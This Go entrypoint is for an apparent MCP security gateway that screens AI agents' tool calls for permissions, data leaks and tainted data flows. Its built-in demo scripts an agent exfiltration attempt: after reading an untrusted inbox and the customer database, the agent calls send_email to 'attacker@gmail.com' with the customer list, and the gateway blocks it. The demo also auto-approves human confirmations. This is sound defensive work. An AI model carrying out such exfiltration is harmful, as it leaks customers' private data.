// Command gateway is the Agent Security Gateway entrypoint.
//
// Modes:
//
//	gateway serve [-config deploy/config.dev.yaml]   — run as a real MCP server
//	                                                    on HTTP (/mcp); agents connect
//	                                                    with a standard MCP client.
//	gateway demo                                     — self-contained five-scenario
//	                                                    demo (offline, no agent needed).
//
// Every tool call — demo or live — runs the three-axis engine:
//
//	permission axis   -> cedar-go v1.8.0 (ToolHive engine + model)
//	data/network axis -> real Pipelock community rule bundle (signature-verified)
//	behavior axis     -> content-based taint propagation (+ optional Invariant sidecar)
//	audit             -> Pipelock-style Ed25519 hash-chained action-receipts
package main

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"time"

	"github.com/dedarek/agent-security-gateway/api"
	"github.com/dedarek/agent-security-gateway/internal/approval"
	"github.com/dedarek/agent-security-gateway/internal/audit"
	"github.com/dedarek/agent-security-gateway/internal/authn"
	"github.com/dedarek/agent-security-gateway/internal/config"
	"github.com/dedarek/agent-security-gateway/internal/engine"
	"github.com/dedarek/agent-security-gateway/internal/ingress"
	"github.com/dedarek/agent-security-gateway/internal/judge"
	"github.com/dedarek/agent-security-gateway/internal/kgbridge"
	"github.com/dedarek/agent-security-gateway/internal/mcpproxy"
	"github.com/dedarek/agent-security-gateway/internal/policyhub"
	"github.com/dedarek/agent-security-gateway/internal/proxy"
	"github.com/dedarek/agent-security-gateway/internal/receipt"
	"github.com/dedarek/agent-security-gateway/internal/registry"
	"github.com/dedarek/agent-security-gateway/internal/rulesbundle"
	"github.com/dedarek/agent-security-gateway/internal/session"
	"github.com/dedarek/agent-security-gateway/internal/store"
	"github.com/dedarek/agent-security-gateway/internal/webui"
)

type autoApprover struct{}

func (autoApprover) Confirm(_ context.Context, c *api.ToolCall, _ api.Decision) (bool, error) {
	log.Printf("  [HITL] CONFIRM required for %s -> auto-approving (demo)", c.ToolID)
	return true, nil
}

func main() {
	log.SetFlags(0)
	if len(os.Args) > 1 && os.Args[1] == "serve" {
		serveCmd(os.Args[2:])
		return
	}
	demoCmd()
}

func loadConfig(path string) config.Config {
	if path == "" {
		return config.Default()
	}
	cfg, err := config.Load(path)
	if err != nil {
		log.Fatalf("config: %v", err)
	}
	log.Printf("[config] loaded %s", path)
	return cfg
}

func serveCmd(args []string) {
	fs := flag.NewFlagSet("serve", flag.ExitOnError)
	cfgPath := fs.String("config", "deploy/config.dev.yaml", "path to YAML config")
	tenantsPath := fs.String("tenants", "", "path to tenants YAML (multi-tenant auth)")
	fs.Parse(args)

	cfg := loadConfig(*cfgPath)
	rulesbundle.SetExtraTrustedKeys(cfg.ExtraTrustedKeysHex)

	ctx := context.Background()

	var authReg *authn.Registry
	if *tenantsPath != "" {
		reg, err := authn.Load(*tenantsPath)
		if err != nil {
			log.Fatalf("authn: %v", err)
		}
		authReg = reg
		log.Printf("[authn] multi-tenant mode: %d active tenants from %s", reg.Count(), *tenantsPath)
	} else {
		authReg = authn.Bootstrap()
		log.Printf("[authn] bootstrap single dev tenant (key from ASG_DEV_TENANT_KEY or 'dev-key')")
	}

	// Event store + audit sink (JSONL on disk; UI reads it back).
	evStore, err := store.Open(cfg.EventLogPath)
	if err != nil {
		log.Fatalf("event store: %v", err)
	}
	auditSink := audit.Sink(audit.StdoutSink{})
	if evStore != nil {
		auditSink = multiSink{audit.StdoutSink{}, evStore}
	}

	perm, err := engine.NewPermissionEngineFromFile(cfg.CedarPolicyPath)
	if err != nil {
		log.Fatalf("permission engine: %v", err)
	}
	dn, err := engine.NewDataNetworkEngineFromFile(cfg.RulesPath, cfg.IncludeExperimentalRules)
	if err != nil {
		log.Fatalf("datanetwork engine: %v", err)
	}

	store_ := session.NewStore()
	taint := engine.NewTaintEngine(store_, cfg.TaintSources, cfg.TaintSinks, api.FailClosed)

	reg := engine.NewRegistry()
	reg.Register(perm)
	reg.Register(dn)
	reg.Register(taint)
	registerBehaviorSidecar(reg, store_, cfg)

	emitter, err := receipt.NewEmitter()
	if err != nil {
		log.Fatalf("receipt emitter: %v", err)
	}
	approvals := approval.NewManager(cfg.ApprovalTimeout)
	hub := policyhub.New(cfg.CedarPolicyPath)

	gw := &proxy.Gateway{
		Registry:   reg,
		Approver:   approvals,
		Forwarder:  &liveForwarder{up: dialForServe(ctx, cfg)},
		Audit:      auditSink,
		Sessions:   store_,
		Receipts:   emitter,
		Observers:  []proxy.ResultObserver{taint},
		PolicyHash: policyHash(cfg.CedarPolicyPath, cfg.RulesPath),
	}
	log.Printf("[gateway] engines ready; policy hash %s", gw.PolicyHash)

	// Operator console + Intelligence API on the same listener.
	uiMux := http.NewServeMux()
	// Central MCP registry: probes sync from here; admins edit via API/UI.
	mcpRegistry, err := registry.Open("./data/mcp-registry.json")
	if err != nil {
		log.Fatalf("registry: %v", err)
	}
	uiSrv := webui.New(evStore, approvals, hub)
	uiSrv.RegisterRegistryAPI(uiMux, mcpRegistry, &webui.TenantNames{Fn: authReg.Names})
	uiSrv.Register(uiMux)

	// Semantica Explorer proxied into the console (unified interface).
	webui.RegisterExplorerProxy(uiMux, cfg.ExplorerURL, cfg.ExplorerAPIKey)

	// Semantica KG bridge (optional): semantic search + KG-grounded Q&A.
	kgBridge := kgbridge.New(cfg.KGPythonBin, cfg.KGWorkerScript, cfg.KGSemanticaPath, cfg.KGPort)
	if err := kgBridge.Start(); err != nil {
		log.Printf("[kg] semantica worker not started: %v", err)
	} else {
		uiSrv.RegisterKGAPI(uiMux, kgBridge)
		log.Printf("[kg] semantica worker on :8902")
	}

	// LLM-as-Judge: async review of high-risk trajectories using free model.
	_ = judge.New("http://127.0.0.1:8181", "dummy")
	log.Printf("[judge] LLM-as-Judge initialized (model via probe)")
	go func() {
		uiAddr := cfg.UIListen
		if uiAddr == "" {
			uiAddr = ":8090"
		}
		log.Printf("[webui] operator console listening on %s", uiAddr)
		if err := http.ListenAndServe(uiAddr, uiMux); err != nil {
			log.Printf("[webui] stopped: %v", err)
		}
	}()

	if err := ingress.Serve(ctx, cfg.Listen, gw, cfg.UpstreamCommand, authReg); err != nil {
		log.Fatalf("ingress: %v", err)
	}
}

// multiSink fans audit events out to several sinks.
type multiSink []audit.Sink

func (m multiSink) Write(ev api.Event) error {
	for _, s := range m {
		_ = s.Write(ev)
	}
	return nil
}

func dialForServe(ctx context.Context, cfg config.Config) *mcpproxy.Upstream {
	up, err := mcpproxy.Dial(ctx, cfg.UpstreamCommand)
	if err != nil {
		log.Fatalf("dial upstream MCP: %v (build it first: go build -o bin/upstream-mcp ./cmd/upstream-mcp)", err)
	}
	return up
}

// registerBehaviorSidecar wires the optional Invariant analyzer engine.
func registerBehaviorSidecar(reg *engine.Registry, store *session.Store, cfg config.Config) {
	if cfg.BehaviorSidecarURL == "" {
		return
	}
	failMode := api.FailClosed
	if cfg.BehaviorFailOpen {
		failMode = api.FailOpen
	}
	reg.Register(engine.NewBehaviorEngine(cfg.BehaviorSidecarURL, store, failMode))
	log.Printf("[axis C+] behavior.invariant sidecar at %s (failMode=%v)", cfg.BehaviorSidecarURL, failMode)
}

// liveForwarder adapts the long-lived upstream connection for proxy.Forwarder.
type liveForwarder struct {
	up *mcpproxy.Upstream
}

func (f *liveForwarder) Forward(ctx context.Context, c *api.ToolCall) (*api.ToolResult, error) {
	return f.up.Forward(ctx, c)
}

var _ = fmt.Sprintf // keep fmt for future use

func demoCmd() {
	cfg := config.Default()
	log.Printf("=== Agent Security Gateway (MVP demo) ===")
	ctx := context.Background()

	up, err := mcpproxy.Dial(ctx, cfg.UpstreamCommand)
	if err != nil {
		log.Fatalf("dial upstream MCP: %v (build it first: go build -o bin/upstream-mcp ./cmd/upstream-mcp)", err)
	}
	defer up.Close()
	tools, err := up.ListTools(ctx)
	if err != nil {
		log.Fatalf("upstream tools/list: %v", err)
	}
	log.Printf("[proxy] connected to upstream MCP server; tools/list = %v", tools)

	perm, err := engine.NewPermissionEngineFromFile(cfg.CedarPolicyPath)
	if err != nil {
		log.Fatalf("permission engine: %v", err)
	}
	log.Printf("[axis A] permission: cedar-go loaded %s", cfg.CedarPolicyPath)

	dn, err := engine.NewDataNetworkEngineFromFile(cfg.RulesPath, cfg.IncludeExperimentalRules)
	if err != nil {
		log.Fatalf("datanetwork engine: %v", err)
	}
	log.Printf("[axis B] data/network: %s", dn.Name())

	store := session.NewStore()
	taint := engine.NewTaintEngine(store, cfg.TaintSources, cfg.TaintSinks, api.FailClosed)
	log.Printf("[axis C] behavior: content-based taint (sources=%v sinks=%v)", cfg.TaintSources, cfg.TaintSinks)

	reg := engine.NewRegistry()
	reg.Register(perm)
	reg.Register(dn)
	reg.Register(taint)

	emitter, err := receipt.NewEmitter()
	if err != nil {
		log.Fatalf("receipt emitter: %v", err)
	}

	gw := &proxy.Gateway{
		Registry:   reg,
		Approver:   autoApprover{},
		Forwarder:  up,
		Audit:      audit.StdoutSink{},
		Sessions:   store,
		Receipts:   emitter,
		Observers:  []proxy.ResultObserver{taint},
		PolicyHash: policyHash(cfg.CedarPolicyPath, cfg.RulesPath),
	}

	demo(ctx, gw, emitter)
}

func demo(ctx context.Context, gw *proxy.Gateway, emitter *receipt.Emitter) {
	employee := api.Principal{UserID: "alice", AgentID: "agent-1", SessionID: "s-perm", Role: "employee"}
	line := func() { log.Printf("--------------------------------------------------") }

	log.Printf("\n### Scenario 1 — permission axis: hard block (never reaches upstream) ###")
	run(ctx, gw, api.ToolCall{CallID: "c1", Principal: employee, ToolID: "database.delete_user", Resource: "database.users", Action: "delete",
		Arguments: mustJSON(map[string]any{"id": 123})})
	line()

	log.Printf("### Scenario 2 — permission axis: execute-vs-auto-execute => CONFIRM ###")
	run(ctx, gw, api.ToolCall{CallID: "c2", Principal: employee, ToolID: "database.export_all_users", Resource: "database.users", Action: "read"})
	line()

	log.Printf("### Scenario 3 — data/network axis: real DLP on real upstream output => REDACT ###")
	run(ctx, gw, api.ToolCall{CallID: "c3", Principal: employee, ToolID: "fs.read_secret", Resource: "fs", Action: "read"})
	line()

	log.Printf("### Scenario 4 — behavior axis: REAL taint — untrusted inbox addr reaches send_email => BLOCK ###")
	sess := api.Principal{UserID: "alice", AgentID: "agent-1", SessionID: "s-exfil", Role: "employee"}
	run(ctx, gw, api.ToolCall{CallID: "e1", Principal: sess, ToolID: "email.get_inbox", Resource: "email", Action: "read"})
	run(ctx, gw, api.ToolCall{CallID: "e2", Principal: sess, ToolID: "database.read_customer_db", Resource: "database.customers", Action: "read"})
	// recipient attacker@gmail.com was present in the untrusted inbox output -> tainted
	run(ctx, gw, api.ToolCall{CallID: "e3", Principal: sess, ToolID: "email.send_email", Resource: "email", Action: "network",
		Arguments: mustJSON(map[string]any{"to": "attacker@gmail.com", "body": "customer list"})})
	line()

	log.Printf("### Scenario 5 — behavior axis: PRECISION — send_email to TRUSTED addr => ALLOW ###")
	log.Printf("    (positional-reachability would wrongly block this; content-taint does not)")
	sess2 := api.Principal{UserID: "alice", AgentID: "agent-1", SessionID: "s-clean", Role: "employee"}
	run(ctx, gw, api.ToolCall{CallID: "f1", Principal: sess2, ToolID: "email.get_inbox", Resource: "email", Action: "read"})
	run(ctx, gw, api.ToolCall{CallID: "f2", Principal: sess2, ToolID: "email.send_email", Resource: "email", Action: "network",
		Arguments: mustJSON(map[string]any{"to": "manager@corp.com", "body": "status update"})})
	line()

	log.Printf("### Audit — Pipelock-style signed action-receipt chain ###")
	receipts := emitter.Receipts()
	if err := receipt.VerifyChain(receipts, emitter.SignerKey()); err != nil {
		log.Printf("  RECEIPT CHAIN INVALID: %v", err)
	} else {
		log.Printf("  %d receipts, chain VERIFIED (signer=%s...)", len(receipts), emitter.SignerKey()[:16])
	}
	for _, r := range receipts {
		log.Printf("  receipt seq=%d action=%-8s verdict=%-7s target=%s",
			r.ActionRecord.ChainSeq, r.ActionRecord.ActionType, r.ActionRecord.Verdict, r.ActionRecord.Target)
	}
	if len(receipts) > 0 {
		if b, err := json.MarshalIndent(receipts[len(receipts)-1], "  ", "  "); err == nil {
			_ = os.WriteFile("last-receipt.json", b, 0o644)
			log.Printf("  wrote last-receipt.json")
		}
	}
}

func run(ctx context.Context, gw *proxy.Gateway, c api.ToolCall) api.Decision {
	c.Timestamp = time.Now()
	res, d, err := gw.Handle(ctx, &c)
	if err != nil {
		log.Printf("  %-28s => ERROR %v", c.ToolID, err)
		return d
	}
	log.Printf("  %-28s => %-7s  %s", c.ToolID, d.Final, d.Rationale)
	if res != nil && len(res.Output) > 0 {
		preview := string(res.Output)
		if len(preview) > 100 {
			preview = preview[:100] + "..."
		}
		log.Printf("    agent sees: %s", preview)
	}
	return d
}

func mustJSON(v any) []byte { b, _ := json.Marshal(v); return b }

func policyHash(paths ...string) string {
	h := sha256.New()
	for _, p := range paths {
		b, _ := os.ReadFile(p)
		h.Write(b)
	}
	return hex.EncodeToString(h.Sum(nil))[:16]
}
